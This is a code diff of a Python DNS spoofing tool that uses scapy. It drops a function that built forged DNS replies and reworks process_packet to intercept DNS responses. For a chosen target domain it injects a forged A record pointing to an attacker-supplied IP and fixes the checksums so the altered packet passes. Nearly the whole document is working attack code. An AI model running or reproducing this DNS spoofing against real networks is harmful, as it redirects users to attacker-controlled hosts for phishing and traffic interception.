@@ -2,57 +2,24 @@ from scapy.all import IP, DNS, DNSQR, DNSRR, Ether
 from scapy.layers.inet import IP, UDP, TCP
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 
-def construct_dns_response(packet, spoof_ip):
-    # Construct the DNS Response
-    eth = Ether(
-        src=packet[Ether].dst,
-        dst=packet[Ether].src)
-
-    # Construct the IP header by looking at the sniffed packet
-    ip = IP(
-        src=packet[IP].dst,
-        dst=packet[IP].src)
-
-    # Construct the UDP header by looking at the sniffed packet    
-    if packet.haslayer(UDP):
-        udp = UDP(
-            dport=packet[UDP].sport,
-            sport=packet[UDP].dport)
-    else:
-        udp = UDP(
-            dport=packet[TCP].sport,
-            sport=packet[TCP].dport)
-
-    # Construct the DNS response by looking at the sniffed packet and manually
-    dns = DNS(
-        id=packet[DNS].id,
-        qd=packet[DNS].qd,
-        aa=1,
-        rd=0,
-        qr=1,
-        qdcount=1,
-        ancount=1,
-        nscount=0,
-        arcount=0,
-        ar=DNSRR(
-            rrname=packet[DNS].qd.qname,
-            type='A',
-            ttl=600,
-            rdata=spoof_ip))
-
-    # Put the full packet together
-    response_packet = eth / ip / udp / dns
-
-    return response_packet
-
 def process_packet(target_domain, spoof_ip, payload) -> bytes:
     scapy_packet = IP(bytes(payload))
     if scapy_packet.haslayer(DNSRR):
-        q_name = scapy_packet[DNSQR].qname.decode("utf-8")
-        print("[*] DNS request for {}".format(q_name))
-        if target_domain in q_name:
-            print("[+] Spoofing DNS Request for {} to {}".format(q_name, spoof_ip))
+        try:
+            q_name = scapy_packet[DNSQR].qname
+            str_q_name = q_name.decode("ascii")
+            print("[*] DNS response for {} detected".format(str_q_name))
+            if target_domain in str_q_name:            
+                print("[+] Spoofing DNS response for {} to {}".format(str_q_name, spoof_ip))
+                scapy_packet[DNS].an = DNSRR(rrname=q_name, rdata=spoof_ip)
+                scapy_packet[DNS].ancount = 1
+                del scapy_packet[IP].len
+                del scapy_packet[IP].chksum
+                if scapy_packet.haslayer(UDP):            
+                    del scapy_packet[UDP].len
+                    del scapy_packet[UDP].chksum
+                return bytes(scapy_packet)
+        except IndexError as error:
+            print("[!] Python exception: {}".format(error))
 
-            return bytes(construct_dns_response(scapy_packet, spoof_ip))
-    
     return []
